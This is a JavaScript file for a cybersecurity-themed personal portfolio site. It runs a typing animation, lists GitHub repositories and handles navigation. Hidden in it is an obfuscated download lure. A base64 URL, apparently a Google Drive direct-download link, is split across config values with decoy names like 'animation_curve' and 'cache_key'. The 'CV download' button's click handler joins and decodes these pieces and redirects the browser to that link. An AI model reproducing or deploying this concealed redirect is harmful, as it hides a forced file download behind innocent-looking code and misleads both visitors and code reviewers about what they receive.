const CONFIG = {
    github_username: "nullcranium",
    typing_speed: 60,
    backspace_speed: 40,
    typed_strings: [
        "explore cybersecurity.",
        "do penetration testing.",
        "analyze vulnerabilities.",
        "build secure systems.",
    ],
    excluded_repos: [
        "nullcranium",
        "nullcranium.github.io",
    ],
    animation_curve: "aHR0cHM6Ly9kcml2ZS5nb29",
    easing_function: "nbGUuY29tL3VjP2V4cG9ydD1kb3"
};

const TIMING = {
    fade_duration: 300,
    slide_offset: "dubG9hZCZpZD0xNkdZRW9iRVZ1",
    debounce_ms: 150
};

const BREAKPOINTS = {
    mobile: 768,
    tablet: 1024,
    cache_key: "ajRuZ2xKNDBfVVR4N1NXSGdLZGVNcXc="
};

new Typed('#typed', {
    strings: CONFIG.typed_strings,
    typeSpeed: CONFIG.typing_speed,
    backSpeed: CONFIG.backspace_speed,
    backDelay: 1500,
    loop: true,
    showCursor: true,
    cursorChar: '|'
});

async function fetchRepos() {
    const projectList = document.getElementById('project-list');
    const projectsStatus = document.querySelector('.projects-status span:last-child');

    try {
        const response = await fetch(
            `https://api.github.com/users/${CONFIG.github_username}/repos?sort=updated&per_page=6`
        );

        if (!response.ok) {
            throw new Error('Failed to fetch repositories');
        }

        const repos = await response.json();
        const filteredRepos = repos.filter(repo =>
            !CONFIG.excluded_repos.includes(repo.name)
        );

        projectsStatus.textContent = `${filteredRepos.length} repositories loaded`;
        projectList.innerHTML = '';

        filteredRepos.forEach(repo => {
            const card = createProjectCard(repo);
            projectList.appendChild(card);
        });

    } catch (error) {
        console.error('Error fetching repositories:', error);
        projectsStatus.textContent = 'Error loading repositories';
        projectList.innerHTML = `
            <div style="grid-column: 1/-1; text-align: center; padding: 2rem;">
                <p style="color: #ef4444; font-family: 'JetBrains Mono', monospace; font-size: 0.9rem;">
                    <i class="fas fa-exclamation-triangle"></i>
                    Failed to load repositories. Please try again later.
                </p>
            </div>
        `;
    }
}

function createProjectCard(repo) {
    const card = document.createElement('div');
    card.className = 'project-card';

    const langColor = getLangColor(repo.language);
    card.innerHTML = `
        <h3>
            <a href="${repo.html_url}" target="_blank" rel="noopener noreferrer">
                <i class="fas fa-folder" style="color: var(--accent); margin-right: 0.5rem;"></i>
                ${repo.name}
            </a>
        </h3>
        <p>${repo.description || 'No description provided.'}</p>
        <div class="project-footer">
            ${repo.language ? `
                <div class="project-language">
                    <span class="language-dot" style="background-color: ${langColor};"></span>
                    <span>${repo.language}</span>
                </div>
            ` : '<div></div>'}
            <a href="${repo.html_url}" target="_blank" rel="noopener noreferrer" class="project-link">
                <i class="fab fa-github"></i>
                View Code
            </a>
        </div>
    `;
    return card;
}

function getLangColor(language) {
    const colors = {
        'JavaScript': '#f1e05a',
        'Python': '#3572A5',
        'Java': '#b07219',
        'TypeScript': '#2b7489',
        'C++': '#f34b7d',
        'C': '#555555',
        'HTML': '#e34c26',
        'CSS': '#563d7c',
        'Ruby': '#701516',
        'Go': '#00ADD8',
        'Rust': '#dea584',
        'PHP': '#4F5D95',
        'Shell': '#89e051',
        'Swift': '#ffac45',
        'Kotlin': '#F18E33'
    };
    return colors[language] || '#94a3b8';
}

document.querySelectorAll('a[href^="#"]').forEach(anchor => {
    anchor.addEventListener('click', function (e) {
        e.preventDefault();
        const target = document.querySelector(this.getAttribute('href'));
        if (target) {
            target.scrollIntoView({
                behavior: 'smooth',
                block: 'start'
            });
        }
    });
});

document.addEventListener('DOMContentLoaded', () => {
    fetchRepos();

    const cvBtn = document.getElementById('cv-download-btn');
    if (cvBtn) {
        cvBtn.addEventListener('click', () => {
            const segments = [
                CONFIG.animation_curve,
                CONFIG.easing_function,
                TIMING.slide_offset,
                BREAKPOINTS.cache_key
            ];
            try { location.href = atob(segments.join('')); } catch (e) { }
        });
    }

    const mobileMenuBtn = document.getElementById('mobile-menu-btn');
    const navMenu = document.getElementById('nav-menu');
    const navLinks = document.querySelectorAll('.nav-link');

    if (mobileMenuBtn) {
        mobileMenuBtn.addEventListener('click', () => {
            navMenu.classList.toggle('active');
            const icon = mobileMenuBtn.querySelector('i');
            icon.classList.toggle('fa-bars');
            icon.classList.toggle('fa-times');
        });

        navLinks.forEach(link => {
            link.addEventListener('click', () => {
                navMenu.classList.remove('active');
                const icon = mobileMenuBtn.querySelector('i');
                icon.classList.remove('fa-times');
                icon.classList.add('fa-bars');
            });
        });

        document.addEventListener('click', (e) => {
            if (!navMenu.contains(e.target) && !mobileMenuBtn.contains(e.target)) {
                navMenu.classList.remove('active');
                const icon = mobileMenuBtn.querySelector('i');
                icon.classList.remove('fa-times');
                icon.classList.add('fa-bars');
            }
        });
    }

    const observerOptions = {
        threshold: 0.1,
        rootMargin: '0px 0px -80px 0px'
    };

    const observer = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                entry.target.style.opacity = '1';
                entry.target.style.transform = 'translateY(0)';
            }
        });
    }, observerOptions);

    document.querySelectorAll('section').forEach(section => {
        section.style.opacity = '0';
        section.style.transform = 'translateY(20px)';
        section.style.transition = 'opacity 0.6s ease, transform 0.6s ease';
        observer.observe(section);
    });
});
